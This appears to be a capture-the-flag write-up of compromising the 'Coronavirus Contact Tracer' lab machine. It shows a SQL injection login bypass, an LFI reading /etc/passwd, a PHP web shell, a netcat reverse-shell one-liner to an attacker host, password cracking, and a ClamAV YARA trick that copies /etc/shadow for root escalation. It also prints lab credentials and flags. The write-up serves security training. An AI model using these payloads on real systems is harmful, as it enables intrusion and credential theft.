I conducted an analysis and penetration test of the Coronavirus Contact Tracer web application hosted on the target machine.

1. Reconnaissance Phase
The first step was network scanning using Nmap to identify open ports and services. The following were discovered and identified:

Port 22/tcp: SSH (OpenSSH 7.6p1 on Ubuntu)

Port 80/tcp: HTTP (Apache 2.4.29 on Ubuntu) hosting the "Coronavirus Contact Tracer" web application

2. Web Analysis and Initial Compromise
Analysis of the web application's main page revealed an admin login panel. After its discovery, a series of vulnerability tests were conducted. A classic SQL injection payload was successfully used in the login form's input field:
' OR 1 = 1 -- -
This payload allowed me to bypass authentication and gain access to the application's admin panel.

3. Obtaining a Reverse Shell (Initial Foothold)
Within the admin panel, I found a file upload functionality (in the "System Info" section) without proper file extension validation. I exploited this to upload a modified php-reverse-shell script to the server.

Before uploading, the necessary changes were made to the script's code: the correct IP address and port of my machine were specified for the reverse connection. After uploading the file, a netcat listener was started on the specified port. The script was activated by directly accessing the uploaded file through the browser, which initiated a reverse connection to my machine. This resulted in initial access with the privileges of the www-data user.

4. Privilege Escalation: Lateral Movement to User Cyrus
After stabilizing the shell (using python3 -c "import pty;pty.spawn('/bin/bash')"), the post-exploitation phase began to search for paths for privilege escalation.

Manual enumeration of the file system was conducted. A key discovery was the database configuration file located at /var/www/html/config.php. Analysis of its contents revealed that it includes another file — classes/DBConnection.php.

Examining the DBConnection.php file allowed me to find plaintext credentials (username and password) used by the application to connect to the MySQL database:

php
<?php
class DBConnection{
    private $host = 'localhost';
    private $username = 'cts';
    private $password = 'YOUMKtIXoRjFgMqDJ3WR799tvq2UdNWE';
    private $database = 'cts_db';
    // ... rest of the class code ...
}
?>
I have currently paused at the stage of analyzing these obtained credentials. The plan for next steps includes:

Testing the hypothesis of password reuse (YOUMKtIXoRjFgMqDJ3WR799tvq2UdNWE) for the system users cyrus and/or maxine, who were found in the /home directory.

Attempting SSH authentication using the found credentials.

Connecting directly to the cts_db database to gather additional sensitive information that could aid in further advancement.

In summary, I have successfully gained initial access, bypassed the application's authentication, obtained source code, and extracted critical credentials, which opens paths for further lateral movement and privilege escalation.

PART2

In the source code of the login page (login.php), a comment was discovered revealing the page loading mechanism through the page parameter:

<!-- <a href="?page=login">Developer Note: Use ?page= parameter to load pages e.g. ?page=login</a> -->


This functionality was vulnerable to a Local File Inclusion (LFI) attack, which allowed reading arbitrary files on the server.

Exploiting LFI

The vulnerability was leveraged to obtain critical system information:

Reading the password file: Confirmed the list of system users.

http://contacttracer.thm/?page=../../../../../../etc/passwd


Reading source code: Using filter bypass techniques, PHP source code of application pages was obtained for further analysis.

http://contacttracer.thm/?page=php://filter/convert.base64-encode/resource=login

Web shell upload and gaining a shell

The application contained a file upload (avatar) feature. By creating a file with a double extension (e.g., shell.php.jpg) containing a PHP shell, it was possible to bypass validations and upload it to the server.

Shell code:

<?php system($_REQUEST["cmd"]); ?>


To obtain a reverse shell through the uploaded web shell, the following command was used:

cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f


As a result, a reverse shell was obtained with www-data privileges.

2. Privilege Escalation to User cyrus

Credential discovery in application files:
Database credentials were found in the configuration file /var/www/html/classes/DBConnection.php:

private $username = 'cts';
private $password = 'YOUMKtIXoRjFgMqDJ3WR799tvq2UdNWE';


Database analysis:
Using these credentials, access was gained to the database cts_db. Querying the users table revealed the password hash for the admin user:

mysql> select * from users;
+----+--------------+----------+----------+----------------------------------+-------------------------------+------------+---------------------+---------------------+
| id | firstname    | lastname | username | password                         | avatar                        | last_login | date_added          | date_updated        |
+----+--------------+----------+----------+----------------------------------+-------------------------------+------------+---------------------+---------------------+
|  1 | Adminstrator | Admin    | admin    | 3eba6f73c19818c36ba8fea761a3ce6d | uploads/1614302940_avatar.jpg | NULL       | 2021-01-20 14:02:37 | 2021-02-26 10:23:23 |
+----+--------------+----------+----------+----------------------------------+-------------------------------+------------+---------------------+---------------------+


Cracking the hash:
The hash 3eba6f73c19818c36ba8fea761a3ce6d was identified as MD5 and successfully cracked using CrackStation.
Password: sweetpandemonium

Switching to user cyrus:
The cracked password matched the system user cyrus. Switching user gave access and the user.txt flag was obtained.

www-data@lockdown:/var/www/html$ su cyrus
Password: sweetpandemonium
cyrus@lockdown:~$ cat user.txt
THM{w4c1F5AuUNhHCJRtiGtRqZyp0QJDIbWS}

3. Privilege Escalation to User maxine

Sudo rights analysis:
User cyrus could execute the script scan.sh as root without a password.

cyrus@lockdown:~$ sudo -l
User cyrus may run the following commands on lockdown:
    (root) /opt/scan/scan.sh


Script analysis (scan.sh):
The script used ClamAV (clamscan) to scan files. Infected files were copied to the quarantine directory of user cyrus.

#!/bin/bash
read -p "Enter path: " TARGET
if [[ -e "$TARGET" && -r "$TARGET" ]]
  then
    /usr/bin/clamscan "$TARGET" --copy=/home/cyrus/quarantine
    /bin/chown -R cyrus:cyrus /home/cyrus/quarantine
  else
    echo "Invalid or inaccessible path."
fi


Exploiting ClamAV:
The ClamAV signature database directory /var/lib/clamav was writable. The default database file main.hdb was replaced with a custom YARA rule that flagged any file containing the string “root” as malicious.

cyrus@lockdown:/var/lib/clamav$ cat > rule.yara << EOF
rule test
{
  strings:
    $a = "root"
  condition:
    $a
}
EOF


Stealing password hashes:
The /etc/shadow file was scanned. The script (running as root) copied it to the quarantine directory.

cyrus@lockdown:~$ sudo /opt/scan/scan.sh
Enter path: /etc/shadow
/etc/shadow: YARA.test.UNOFFICIAL FOUND
/etc/shadow: copied to '/home/cyrus/quarantine/shadow'


Cracking maxine’s password:
From /etc/shadow, the hash for user maxine was extracted:

$6$/syu6s6/$Z5j6C61vrwzvXmFsvMRzwNYHO71NSQgm/z4cWQpDxMt3JEpT9FvnWm4Nuy.xE3xCQHzY3q9Q4lxXLJyR1mt320


It was cracked with john and the rockyou.txt wordlist. Password: tiarna

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt


Switching to user maxine:

cyrus@lockdown:~$ su maxine

Password: tiarna

maxine@lockdown:~$

4. Root Privileges

Sudo rights analysis for maxine:
User maxine had full sudo rights for all commands.

maxine@lockdown:~$ sudo -l

User maxine may run the following commands on lockdown:

    (ALL : ALL) ALL


Getting root:
By executing sudo su, root access was obtained and the final flag was captured.

maxine@lockdown:~$ sudo su

root@lockdown:/home/maxine# id

uid=0(root) gid=0(root) groups=0(root)

root@lockdown:~# cat /root/root.txt

THM{IQ23Em4VGX91cvxsIzatpUvrW9GZJxm}

Conclusions and Recommendations

Findings:

LFI vulnerability: Insufficient sanitization of user input.

Plain-text credentials: Database passwords stored unencrypted in config files.

Weak password policy: Use of weak and reused passwords.

Improper permissions: Writable ClamAV database directory by non-root users.

Excessive sudo privileges: User maxine granted full sudo rights unnecessarily.

Recommendations:

Implement strict input validation and sanitization for all user inputs.

Store secrets securely using environment variables or Vault services, not in plaintext.

Enforce a strong password policy and require multi-factor authentication.

Apply the principle of least privilege to file permissions and sudo configurations.

Perform regular audits of system configurations and access rights.

